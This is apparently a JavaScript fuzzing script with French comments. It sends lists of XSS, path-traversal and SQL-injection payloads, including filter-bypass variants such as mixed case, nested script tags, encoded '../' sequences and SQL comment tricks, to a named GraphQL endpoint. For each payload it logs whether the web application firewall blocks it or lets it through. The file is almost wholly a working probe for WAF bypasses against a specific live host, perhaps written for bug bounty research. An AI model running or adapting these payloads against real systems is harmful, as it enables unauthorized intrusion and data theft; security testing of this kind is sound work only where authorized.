const EP = "https://bugsecure-api.senintel.sn/graphql";
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const call = async (q, v) => {
  const r = await fetch(EP, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ query: q, variables: v || {} }),
  });
  const t = await r.text();
  let j = null; try { j = JSON.parse(t); } catch {}
  return { s: r.status, t, j };
};

// deux "reflectors" : un parametre strict (username) et un parametre lax (search)
const STRICT = `query($u:String!){ researcherPublicProfile(username:$u){ id } }`;
const LAX = `query($s:String!){ programs(filters:{search:$s},take:2){ id } }`;

const GROUPS = {
  "XSS / HTML": [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x OnErRoR=alert(1)>",
    "<img/src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    "JaVaScRiPt:alert(1)",
    "alert(1)",
    "onerror=alert(1)",
    '<a href=javascript:alert(1)>x</a>',
    "<details open ontoggle=alert(1)>",
    "<img src=x onerror=alert`1`>",
    '"><img src=x onerror=alert(1)>',
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "{{7*7}}",
    "${7*7}",
    "<%=7*7%>",
    "&lt;script&gt;",
    "&#60;script&#62;",
  ],
  "TRAVERSAL": [
    "../",
    "..%2f",
    "..%252f",
    "....//",
    "..\\",
    "%2e%2e%2f",
    "..;/",
    "..%00/",
    "..%0d%0a/",
    ".%2e/",
    "..%c0%af",
    "..%c1%9c",
    "..%ef%bc%8f",
    "..\\..\\..\\etc\\passwd",
  ],
  "SQL (contournements)": [
    "'",
    "a'",
    "a''",
    "'--",
    "'/*",
    "a'||'b",
    "a' OR 1 LIKE 1--",
    "a'OR 1 LIKE 1--",
    "a' or 1 like 1--",
    "a'||chr(49)",
    "a'||(SELECT 1)--",
    "a'||(SELECT 1 WHERE 1=1)--",
    "a'||(SELECT 1 WHERE 1=2)--",
    "a' AND 1 LIKE 1--",
    "a'/**/OR/**/1=1--",
    "a' OR 1=1--",
    "a' AND 1=1--",
    "a' UNION ALL SELECT 1--",
    "a' ORDER BY 1--",
    "a';--",
    "a' LIKE 'b",
    "a'||(SELECT 1)/*",
    "a' OR 1=1#",
    "a' OR 1=1/*",
    "a' OR '1'='1",
  ],
};

(async () => {
  for (const [gname, list] of Object.entries(GROUPS)) {
    console.log("\n================ " + gname + " ================");
    console.log("payload".padEnd(36) + "| strict(username) | lax(search)");
    for (const p of list) {
      const rs = await call(STRICT, { u: p });
      await sleep(700);
      const rl = await call(LAX, { s: p });
      await sleep(700);
      const fmt = (r) => (r.s === 403 ? "403 WAF" : r.s === 200 ? "200 pass" : "HTTP" + r.s + " " + (r.j?.errors ? "gqlerr" : ""));
      console.log(JSON.stringify(p).padEnd(36) + "| " + fmt(rs).padEnd(15) + "| " + fmt(rl));
    }
  }
})();
